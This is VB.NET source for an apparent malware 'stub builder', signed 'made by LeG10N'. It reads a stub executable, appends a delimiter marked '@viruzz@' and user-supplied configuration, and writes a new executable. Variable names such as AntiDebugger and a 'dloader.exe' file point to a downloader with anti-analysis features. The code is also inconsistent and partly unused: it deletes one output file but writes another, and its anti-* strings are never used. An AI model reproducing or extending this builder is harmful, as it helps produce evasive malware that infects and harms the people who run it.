''made by LeG10N''
Imports System.IO
'We need to import this so we don't have to type io.file* when we are using everything. its just a time saver.


Public Class Form1
    'ZOMG! we cant forget this shit!

    'lets make a constant. this will be used so when we split the file on the other side.
    'it tells the command we are going to call later, how to split the file
    'this needs to be completely unique but still memerable
    Const FOilPhCkYdZHeaCA79U3B = "@viruzz@"

    'now we need some strings! this will hold all our stuff! right now all we need is somthing to hold the stub in. and the strings for the boxes
    Dim stub, AntiSanta, AntiDebugger, AntiNazi, AntiEverything As String

    Private Sub Generate_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Generate.Click
        Try
            FileOpen(1, Application.StartupPath & "\stub.exe", OpenMode.Binary, OpenAccess.Read)


            stub = Space(LOF(1))


            FileGet(1, stub)

            FileClose(1)

            If File.Exists(Application.StartupPath & "\dloader.exe") Then
                File.Delete(Application.StartupPath & "\dloader.exe")
            End If


            FileOpen(2, Application.StartupPath & "\Program.exe", OpenMode.Binary, OpenAccess.ReadWrite)


            FilePut(2, stub & FOilPhCkYdZHeaCA79U3B & UsernameBox.Text)
            FileClose(2)


            MessageBox.Show("Built", "Done")


            '
        Catch ex As Exception
            MsgBox(ex.ToString)
        End Try

    End Sub
End Class
